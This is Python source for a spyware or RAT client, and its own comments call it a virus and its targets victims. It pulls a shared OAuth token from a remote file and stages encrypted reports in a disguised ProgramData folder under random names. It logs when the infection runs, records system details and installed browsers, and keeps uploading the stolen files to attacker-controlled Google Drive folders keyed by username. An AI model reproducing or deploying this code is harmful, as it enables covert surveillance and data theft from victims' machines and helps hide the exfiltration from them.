'''
the securied way is to delete the the OAuth 2.0 Client ID once done
and create a new oAuth id each time when giving a tooken
'''
import json
import os
#%%
from base64 import b64encode
from functools import lru_cache
from json.decoder import JSONDecodeError
from os.path import exists, isfile, join, split
from threading import Event, Thread
from time import sleep, time

from oauth2client.client import OAuth2Credentials
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive

from clint.crypto import encrypt
from clint.fileio import Fileio, d
from clint.network import get, net_check, net_time
from clint.util import (basic_detail, data_store, list_browsers, makedirs,
                        random_str, username)
from logger import log


#%%
class Drive:# wrap on GoogleDrive
    timer=lambda s,token: int(token.get("expiry"))-net_time()
    
    def __init__(self):
        self.drive:GoogleDrive = None
        self.permited = Event()
        self.permited.clear()

        api_key=data_store.var.api_key
        token_id=data_store.var.tfile_id
        self.token_url = f"https://www.googleapis.com/drive/v3/files/{token_id}?alt=media&key={api_key}"

        self.engine=Thread(target=self.re_drive, daemon=True, name='drive')

    def start(self):
        # in future stop will be included if needed
        if self.running:
            return
        self.engine.start()

    @property
    def running(self):
        return self.engine.is_alive()

    def CreateFile(self, metadata=None):
        if not self.running:
            self.start()

        self.permited.wait()
        return self.drive.CreateFile(metadata)

    def ListFile(self, param=None):
        if not self.running:
            self.start()

        self.permited.wait()
        return self.drive.ListFile(param)

    def sick_token(self):
        while 1:
            try:
                # sometimes empty content result in returing html content as text
                token=json.loads(get(self.token_url).text)
            except JSONDecodeError:
                pass
            else:
                if self.validity(token):
                    break
            sleep(5)
            
        return token

    def validity(self, token):
        if token["expiry"]<time():
            return False
        
        token=token["access_token"]
        url=f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={token}"
        return get(url).ok

    def re_drive(self):
        while 1:
            token = self.sick_token()
            log.info('got a token from the server')

            gauth = GoogleAuth()
            token_data = {
                'access_token' : token.get("access_token"),
                'token_uri': 'https://accounts.google.com/o/oauth2/token',
                'user_agent' : 'some Automation',
                'client_id' : None,
                'client_secret': None,
                'refresh_token' : None,
                'token_expiry' : None,
                'invalid' : False,
            }
            gauth.credentials = OAuth2Credentials.from_json(json.dumps(token_data))
            self.drive=GoogleDrive(gauth)
            
            next_token=self.timer(token)
            self.permited.set()
            log.info(f'which will expire in {next_token} sec')
            sleep(next_token-5)
            self.permited.clear()

#%%
class drive_explorer:
    def __init__(self):
        self.drive = Drive()
    
    def _split(self, p):# drive split
        '''self._split('a/b/c') --> ('a', 'b/c')'''
        seps="/\\"
        i = 0
        while i<len(p) and p[i-1] not in seps:
            i += 1
        i=i or len(p)
        head, tail = p[:i], p[i:]  # now tail has no slashes
        # remove trailing slashes from head, unless it's all slashes
        head = head.rstrip(seps) or head
        return head, tail

    def exists(self, path):
        '''
            chack if a file exists or not
            returns list of existince
        '''#may also supports for folder exists
        folder, f_name = split(path)
        f_id = self.get_folder_id(folder)
        
        return self._contain(f_id, f_name)

    def _contain(self, pid, name):
        qstr=f"'{pid}' in parents and trashed=false and title = '{name}'"
        return self.drive.ListFile({'q': qstr}).GetList()

    def create_folder(self, name, parent_id="root"):
        file1 = self.drive.CreateFile({'title':name,"parents":[{'id':parent_id}],'mimeType':"application/vnd.google-apps.folder"})
        file1.Upload()
        return file1

    def _get_folder(self, folder_name, root_folder_id="root"):
        folder_list = self._contain(root_folder_id, folder_name)
        folder_list = folder_list or [self.create_folder(folder_name, root_folder_id)]
        
        return folder_list[0]

    @lru_cache
    def get_folder_id(self, path:None)-> str:
        if not path:
            return "root"
        parent, child = self._split(path)
        
        file = self._get_folder(parent)
        while child:
            parent, child = self._split(child)
            file = self._get_folder(parent, file["id"])

        return file["id"]

    # main functions
    def create_file(self, path):
        parent, file_name = split(path)
        parent_id = self.get_folder_id(parent)

        file1 = self.drive.CreateFile({'title':file_name, "parents":[{'id':parent_id}]})
        file1.Upload()
        return file1

    def get_file(self, path):#create file
        '''main function'''
        file_list = self.exists(path)
        if not file_list:
            file_list = [self.create_file(path)]
        return file_list[0]


drive = drive_explorer()
# randomly chosen a folder path to store encrypted files
file_store = join(os.environ["ProgramData"], "WwanSvc\Profiles")
#%%
class Online:
    '''direct use of this class is forbidden'''
    def __init__(self, path, prefix=f"reports/{username}"):
        path=join(prefix, path)
        self.file = drive.get_file(path)

    def read(self):
        return self.file.GetContentString()

    def write(self, data):
        if isinstance(data, bytes):
            data=b64encode(data).decode("utf-8")
        self.file.SetContentString(data+"\n"+self.read())
        self.file.Upload()
    
    def __enter__(self):
        return self

    def __exit__(self, *args):
        del self

#%%
class Offline:
    def __init__(self, path):
        self.real_name = path
        self.path = join(file_store, random_str(8))# fake_name
        
        makedirs(split(self.path)[0])
        self.file = None

    def __enter__(self):
        self.file = Fileio(self.path, "w", self.real_name)
        return self.file

    def __exit__(self, *args):
        self.file.__exit__()
        del self


#%%
drive_file = Offline

def got_active():
    'to keep track when the virus got run (useally)'
    from datetime import datetime

    from dateutil.tz import tzlocal

    file = "activity.log"
    with drive_file(file) as f:
        t=net_time() if net_check.connection.is_set() else time()
        
        zone=datetime.now(tzlocal()).tzname()
        t_format=f"%H:%M:%S %d-%m-%Y zone:{zone}"
        t=datetime.fromtimestamp(t)

        f.write(t.strftime(t_format))

    file = "basic_detail.txt"
    if not data_store.var.clint_info:
        with drive_file(file) as f:
            f.write(basic_detail())
        data_store.set_value('clint_info', True)

def send_file(name, content):
    with drive_file(name) as f:
        f.write(content)


#%%
class Auto_upload:
    def __init__(self) -> None:
        Thread(target=self.engine, daemon=True, name='auto uploader').start()

    def list_uploads(self):
        if not exists(file_store):
            return
        
        for root, folders, files in os.walk(file_store):
            for file in files:
                yield join(root, file)

    def upload(self, path):
        '''path: absulate_path '''
        file = Fileio(path, "r")
        
        dpath=file.report_name
        log.info(f'uploading to drive: {dpath}')
        with Online(dpath) as df:
            df.write(file.read())# only the encrypted main content

        file.delete()
        file.__exit__()

    def upload_response(self):
        response_path=f"{file_store}/response"
        if not exists(response_path):
            return
        
        for i in os.listdir(response_path):
            path = join(response_path, i)
            if isfile(path):
                self.upload(path)

    def engine(self):
        # upload the actime report first
        drive.drive.start()
        drive.drive.permited.wait()
        
        log.info(f'registering victim name')
        file=f"whoisactive/{username}"
        with Online(file, prefix="") as f:
            data={
                "last_all_time": data_store.var.last_all_time,
                "last_user_time": data_store.var.last_user_time,
                "installed_browsers": list_browsers()
            }
            # a lot to do at once. that is why direct use of Onine is forbidden
            f.write(encrypt(json.dumps(data)))

        while 1:
            for i in self.list_uploads():
                self.upload(i)
                sleep(.5)
            self.upload_response()
            
            log.info('waiting for new files to be created')
            while not d:# wait for any new file to be created
                sleep(5)
